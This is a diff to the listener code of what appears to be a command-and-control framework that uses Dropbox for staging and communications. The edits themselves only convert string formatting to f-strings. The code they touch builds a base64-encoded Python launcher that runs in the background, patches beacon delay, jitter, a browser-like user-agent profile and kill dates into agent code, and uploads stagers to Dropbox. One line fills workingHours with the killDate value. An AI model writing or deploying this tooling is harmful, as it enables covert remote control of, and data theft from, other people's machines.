@@ -365,10 +365,7 @@ class Listener:
                 launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                     "UTF-8"
                 )
-                launcher = (
-                    "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
-                    % (launchEncoded)
-                )
+                launcher = f"echo \"import sys,base64;exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
                 return launcher
             else:
                 return launcherBase
@@ -563,26 +560,25 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch some more
-            code = code.replace("delay = 60", "delay = %s" % (delay))
-            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
+            code = code.replace("delay = 60", f"delay = {delay}")
+            code = code.replace("jitter = 0.0", f"jitter = {jitter}")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                'profile = "%s"' % (profile),
+                f'profile = "{profile}"',
             )
-            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
+            code = code.replace("lostLimit = 60", f"lostLimit = {lostLimit}")
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                'defaultResponse = base64.b64decode("%s")'
-                % (b64DefaultResponse.decode("UTF-8")),
+                'defaultResponse = base64.b64decode("{}")'.format(
+                    b64DefaultResponse.decode("UTF-8")
+                ),
             )
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
-                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+                code = code.replace('killDate = ""', f'killDate = "{killDate}"')
             if workingHours != "":
-                code = code.replace(
-                    'workingHours = ""', 'workingHours = "%s"' % (killDate)
-                )
+                code = code.replace('workingHours = ""', f'workingHours = "{killDate}"')
 
             code = code.replace("REPLACE_COMMS", "")
 
@@ -806,10 +802,10 @@ class Listener:
         )
         try:
             # delete stager if it exists
-            delete_file(dbx, "%s/debugps" % (stagingFolder))
-            delete_file(dbx, "%s/debugpy" % (stagingFolder))
-            dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
-            dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
+            delete_file(dbx, f"{stagingFolder}/debugps")
+            delete_file(dbx, f"{stagingFolder}/debugpy")
+            dbx.files_upload(stagerCodeps, f"{stagingFolder}/debugps")
+            dbx.files_upload(stagerCodepy, f"{stagingFolder}/debugpy")
         except dropbox.exceptions.ApiError:
             message = (
                 f"{listenerName}: Error uploading stager to '{stagingFolder}/stager'"
@@ -897,8 +893,8 @@ class Listener:
 
                                     try:
                                         fileName2 = fileName.replace(
-                                            "%s_3.txt" % (sessionID),
-                                            "%s_2.txt" % (sessionID),
+                                            f"{sessionID}_3.txt",
+                                            f"{sessionID}_2.txt",
                                         )
                                         dbx.files_delete(fileName2)
                                     except dropbox.exceptions.ApiError:
